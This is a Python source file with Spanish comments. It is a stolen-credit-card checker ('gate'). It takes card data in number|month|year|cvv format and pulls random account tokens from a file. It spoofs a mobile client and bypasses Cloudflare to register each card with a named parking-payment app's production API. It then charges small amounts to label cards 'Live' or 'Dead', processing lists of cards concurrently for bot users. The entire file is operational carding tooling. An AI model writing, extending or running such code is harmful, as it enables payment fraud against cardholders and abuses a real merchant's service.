import asyncio
import json
import time
from datetime import datetime
from threading import Lock
from collections import defaultdict
import random
import cloudscraper

# Variables globales para control de concurrencia
global_semaphore = asyncio.Semaphore(15)  # Máximo 15 peticiones simultáneas globales
user_semaphore = asyncio.Semaphore(3)  # Máximo 3 peticiones simultáneas por usuario

# Contadores para estadísticas
active_requests_count = 0
user_request_count = defaultdict(int)

def leer_linea_aleatoria():
    """Función para leer un token aleatorio del archivo"""
    try:
        archivo = "data/txt/token1.txt"
        with open(archivo, "r", encoding="utf-8") as f:
            lineas = f.readlines()
        return random.choice(lineas).strip() if lineas else None
    except Exception as e:
        print(f"Error al leer token: {e}")
        return None

def procesar_y_validar(card_data):
    """Procesa y valida los datos de la tarjeta"""
    try:
        parts = card_data.split("|")
        if len(parts) != 4:
            return None
        
        cc_number, mes, ano, cvv = parts
        
        # Validar que el número tenga entre 13 y 19 dígitos
        if not cc_number.isdigit() or len(cc_number) < 13 or len(cc_number) > 19:
            return None
        
        # Validar mes (1-12)
        try:
            mes_int = int(mes)
            if mes_int < 1 or mes_int > 12:
                return None
        except ValueError:
            return None
        
        # Validar año (acepta 2 o 4 dígitos)
        try:
            ano_int = int(ano)
            if len(ano) == 4:
                # Si es año de 4 dígitos (ej. 2030), extraer los últimos 2 dígitos
                if ano_int < 2000 or ano_int > 2099:
                    return None
                ano_2_digits = str(ano_int)[-2:]
            elif len(ano) == 2:
                # Si es año de 2 dígitos (ej. 30), usarlo directamente
                if ano_int < 0 or ano_int > 99:
                    return None
                ano_2_digits = ano
            else:
                return None
        except ValueError:
            return None
        
        # Validar CVV (3-4 dígitos)
        if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
            return None
        
        # Devolver el número, mes, año (en formato 2 dígitos) y CVV
        return cc_number, mes, ano_2_digits, cvv
    except Exception as e:
        print(f"Error al procesar tarjeta: {e}")
        return None

async def _make_gate_request(gate_name, card_data, user_id):
    """
    Función interna para hacer la petición al gate con control de concurrencia
    """
    global active_requests_count
    
    # Incrementar contador de peticiones activas
    active_requests_count += 1
    
    seccion = None
    
    try:
        # Procesar y validar la tarjeta
        resultado = procesar_y_validar(card_data)
        if resultado is None:
            return {
                "status": "❌ Dead",
                "message": "Fechas Invalidas"
            }
        
        cc_number, mes, ano, cvv = resultado
        
        # Crear scraper
        seccion = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'ios', 'mobile': True}, 
            delay=2
        )
        
        inicio = datetime.now()
        
        # Obtener token
        token = leer_linea_aleatoria()
        if not token:
            return {
                "status": "⚠️ Error",
                "message": "No hay tokens disponibles"
            }
        
        # Paso 1: Añadir la tarjeta
        response = await asyncio.to_thread(
            seccion.post,
            url="https://parkingpay-api-prod.azurewebsites.net/api/app/conductor/tarjetas",
            data=f'{{"numero":"{cc_number}","expiracionMes":"{mes}","expiracionYear":"20{ano}"}}',
            headers={
                "user-agent": "Dart/2.18 (dart:io)",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "authorization": token,
                "host": "parkingpay-api-prod.azurewebsites.net"
            }
        )
        
        await asyncio.sleep(5)
        
        if 'This web app is stopped' in response.text or response.status_code == 403:
            return {
                "status": "⚠️ Error",
                "message": f"Gate {gate_name} apagada (web app detenida)"
            }
        
        if response.status_code == 400 or 'Ocurrió un error al crear la tarjeta en stripe' in response.text:
            tiempo = f'{(datetime.now() - inicio).total_seconds():.2f}'
            return {
                "status": "❌ Dead",
                "message": f"Dead - {tiempo} segundos"
            }
        
        stripe_card_id = json.loads(response.text)["stripeCardId"]
        tarjeta_id = None
        
        await asyncio.sleep(3)
        
        # Paso 2: Obtener el tarjetaId
        response = await asyncio.to_thread(
            seccion.get,
            url="https://parkingpay-api-prod.azurewebsites.net/api/app/conductor",
            headers={
                "user-agent": "Dart/2.18 (dart:io)",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "authorization": token,
                "host": "parkingpay-api-prod.azurewebsites.net"
            }
        )
        
        try:
            for tarjeta in json.loads(response.text)["cartera"]["tarjetas"]:
                if tarjeta["stripeInfo"]["stripeCardId"] == stripe_card_id:
                    tarjeta_id = tarjeta["tarjetaId"]
                    break
        except (KeyError, TypeError):
            pass
        
        await asyncio.sleep(5)
        
        if not tarjeta_id:
            tiempo = f'{(datetime.now() - inicio).total_seconds():.2f}'
            return {
                "status": "❌ Dead",
                "message": f"No se encontró tarjetaId - {tiempo} segundos"
            }
        
        # Determinar el monto según el gate
        montos = {
            "Euridice": 100.0,
            "Philotes": 1.0,  # Solo asociación, sin cargo
            "Eurinias": 20.0,
            "Wojtek": 50.0
        }
        
        monto = montos.get(gate_name, 100.0)
        
        # Si es Philotes, no hacer cargo
        if gate_name == "Philotes":
            tiempo = f'{(datetime.now() - inicio).total_seconds():.2f}'
            return {
                "status": "✅ Live",
                "message": f"Charger {monto} Mnx - {tiempo} segundos"
            }
        
        # Paso 3: Realizar el cargo
        response = await asyncio.to_thread(
            seccion.post,
            url="https://parkingpay-api-prod.azurewebsites.net/api/app/conductor/pagos/abono",
            data=f'{{"tarjetaId":"{tarjeta_id}","porAbonar":{monto}}}',
            headers={
                "user-agent": "Dart/2.18 (dart:io)",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "authorization": token,
                "host": "parkingpay-api-prod.azurewebsites.net"
            }
        )
        
        tiempo = f'{(datetime.now() - inicio).total_seconds():.2f}'
        
        # LÓGICA MODIFICADA PARA OCULTAR RESPUESTAS DE ERROR
        if 'stripeCardId' in response.text or response.status_code == 200:
            return {
                "status": "✅ Live",
                "message": f"Charger {monto} Mnx - {tiempo} segundos"
            }
        else:
            # Cualquier otro caso (Dead, Error, Timeout, etc.) muestra mensaje genérico
            return {
                "status": "❌ Dead",
                "message": "Tarjeta delinada"
            }
    
    except Exception as e:
        # Incluso en excepciones de código, mostramos mensaje genérico al usuario
        # Pero imprimimos el error real en la consola del servidor para debugging tuyo
        print(f"Error REAL en gate {gate_name} (Oculto al usuario): {str(e)}")
        return {
            "status": "⚠️ Error",
            "message": "Error avisar a un administrador"
        }
    finally:
        # Decrementar contador de peticiones activas
        active_requests_count -= 1
        # Cerrar el scraper para liberar conexiones
        if seccion is not None:
            try:
                seccion.close()
            except Exception:
                pass

async def gate_check(gate_name, card_data, user_id=None):
    """
    Verifica una tarjeta usando el gate especificado
    
    Args:
        gate_name (str): Nombre del gate (Euridice, Philotes, Eurinias, Wojtek)
        card_data (str): Datos de la tarjeta en formato "numero|mes|año|cvv"
        user_id (int): ID del usuario para control de concurrencia
        
    Returns:
        dict: Respuesta con status y message
    """
    try:
        # Si no se proporciona user_id, usar un valor por defecto
        if user_id is None:
            user_id = 0
        
        # Incrementar contador de peticiones del usuario
        user_request_count[user_id] += 1
        
        try:
            # Usar semáforos para controlar la concurrencia
            async with global_semaphore:
                async with user_semaphore:
                    print(f"Usuario {user_id} - Iniciando procesamiento de tarjeta con gate {gate_name}: {card_data[:6]}xxxx")
                    print(f"Peticiones globales activas: {active_requests_count}")
                    print(f"Peticiones del usuario {user_id} activas: {user_request_count[user_id]}")
                    
                    # Pequeño delay aleatorio para evitar que todas las peticiones lleguen exactamente al mismo tiempo
                    await asyncio.sleep(0.1 + (user_id % 5) * 0.05)
                    
                    # Realizar la petición
                    result = await _make_gate_request(gate_name, card_data, user_id)
                    
                    return result
        finally:
            # Decrementar contador de peticiones del usuario
            user_request_count[user_id] -= 1
                
    except Exception as e:
        return {
            "status": "⚠️ Error",
            "message": f"Error al conectar con el gate: {str(e)}"
        }

async def gate_check_multiple(gate_name, cards_data, user_id=None, callback=None):
    """
    Verifica múltiples tarjetas usando el gate especificado
    
    Args:
        gate_name (str): Nombre del gate (Euridice, Philotes, Eurinias, Wojtek)
        cards_data (list): Lista de datos de tarjetas en formato "numero|mes|año|cvv"
        user_id (int): ID del usuario para control de concurrencia
        callback (function): Función de callback para enviar resultados en tiempo real
        
    Returns:
        list: Lista de respuestas del gate para cada tarjeta
    """
    try:
        # Si no se proporciona user_id, usar un valor por defecto
        if user_id is None:
            user_id = 0
        
        # Limpiar datos de las tarjetas
        cards_data_limpios = [card.strip() for card in cards_data if card.strip()]
        
        print(f"Usuario {user_id} - Iniciando procesamiento masivo de {len(cards_data_limpios)} tarjetas con gate {gate_name}")
        
        # Lista para almacenar los resultados finales
        results = [None] * len(cards_data_limpios)
        
        # Crear una cola para los resultados
        result_queue = asyncio.Queue()
        
        # Función para procesar una tarjeta individualmente
        async def process_single_card(index, card_data):
            try:
                print(f"Usuario {user_id} - Tarjeta {index+1}/{len(cards_data_limpios)} - Iniciando procesamiento")
                
                # Intentar procesar la tarjeta (con hasta 3 reintentos)
                max_retries = 3
                retry_count = 0
                success = False
                
                while retry_count < max_retries and not success:
                    try:
                        # Usar semáforos para controlar la concurrencia
                        async with global_semaphore:
                            async with user_semaphore:
                                print(f"Usuario {user_id} - Tarjeta {index+1}/{len(cards_data_limpios)} - Intento {retry_count+1}/{max_retries}")
                                print(f"Peticiones globales activas: {active_requests_count}")
                                print(f"Peticiones del usuario {user_id} activas: {user_request_count[user_id]}")
                                
                                # Pequeño delay aleatorio para evitar que todas las peticiones lleguen exactamente al mismo tiempo
                                await asyncio.sleep(0.1 + (index % 5) * 0.05)
                                
                                # Realizar la petición
                                result = await _make_gate_request(gate_name, card_data, user_id)
                                
                                # Imprimir información de depuración
                                print(f"Usuario {user_id} - Tarjeta {index+1}/{len(cards_data_limpios)} - Respuesta: {result.get('status', 'Error')}")
                                
                                # Éxito, salir del bucle de reintentos
                                success = True
                                print(f"Usuario {user_id} - Tarjeta {index+1} procesada exitosamente")
                                
                                # Añadir el resultado a la cola para procesamiento inmediato
                                await result_queue.put((index, result))
                                return result
                                
                    except Exception as e:
                        print(f"Usuario {user_id} - Error en el intento {retry_count+1}: {e}")
                        retry_count += 1
                        if retry_count < max_retries:
                            print(f"Usuario {user_id} - Reintentando en 3 segundos...")
                            await asyncio.sleep(3)
                        else:
                            # Agotados los reintentos, devolver resultado de error
                            print(f"Usuario {user_id} - Agotados los reintentos para la tarjeta {index+1}")
                            
                            error_result = {
                                "status": "⚠️ Error",
                                "message": f"Error al procesar tarjeta: {str(e)}"
                            }
                            
                            # Añadir el resultado a la cola para procesamiento inmediato
                            await result_queue.put((index, error_result))
                            return error_result
                    
            except Exception as e:
                print(f"Usuario {user_id} - Error procesando tarjeta {index+1}: {e}")
                
                error_result = {
                    "status": "⚠️ Error",
                    "message": f"Error al procesar tarjeta: {str(e)}"
                }
                
                # Añadir el resultado a la cola para procesamiento inmediato
                await result_queue.put((index, error_result))
                return error_result
        
        # Crear todas las tareas pero no esperar a que se completen
        tasks = []
        for i, card in enumerate(cards_data_limpios):
            task = asyncio.create_task(process_single_card(i, card))
            tasks.append(task)
        
        # Procesador de resultados en tiempo real
        async def process_results():
            processed_count = 0

            while processed_count < len(cards_data_limpios):
                try:
                    index, result = await asyncio.wait_for(result_queue.get(), timeout=2.0)

                    if results[index] is None:
                        results[index] = result
                        processed_count += 1
                        if callback:
                            try:
                                await callback(index, result, cards_data_limpios[index], user_id)
                            except Exception as cb_err:
                                print(f"Error en callback para tarjeta {index+1}: {cb_err}")

                except asyncio.TimeoutError:
                    all_done = all(task.done() for task in tasks)
                    if all_done:
                        while not result_queue.empty():
                            try:
                                index, result = result_queue.get_nowait()
                                if results[index] is None:
                                    results[index] = result
                                    processed_count += 1
                                    if callback:
                                        try:
                                            await callback(index, result, cards_data_limpios[index], user_id)
                                        except Exception as cb_err:
                                            print(f"Error en callback para tarjeta {index+1}: {cb_err}")
                            except asyncio.QueueEmpty:
                                break
                        for i in range(len(cards_data_limpios)):
                            if results[i] is None:
                                results[i] = {
                                    "status": "⚠️ Error",
                                    "message": "Tarjeta no procesada (timeout interno)"
                                }
                                processed_count += 1
                        break
                    continue

                except Exception as e:
                    print(f"Error procesando resultados: {e}")
                    continue

        # Iniciar el procesador de resultados en paralelo
        result_processor = asyncio.create_task(process_results())

        # Esperar a que todas las tareas se completen
        await asyncio.gather(*tasks, return_exceptions=True)

        # Cancelar cualquier tarea que no haya terminado
        for task in tasks:
            if not task.done():
                task.cancel()

        # Esperar a que el procesador de resultados termine
        await result_processor
        
        print(f"Usuario {user_id} - Procesadas {len([r for r in results if r is not None])} tarjetas en paralelo con gate {gate_name}")
        
        return results
                
    except Exception as e:
        return [{
            "status": "⚠️ Error",
            "message": f"Error al conectar con el gate: {str(e)}"
        }]
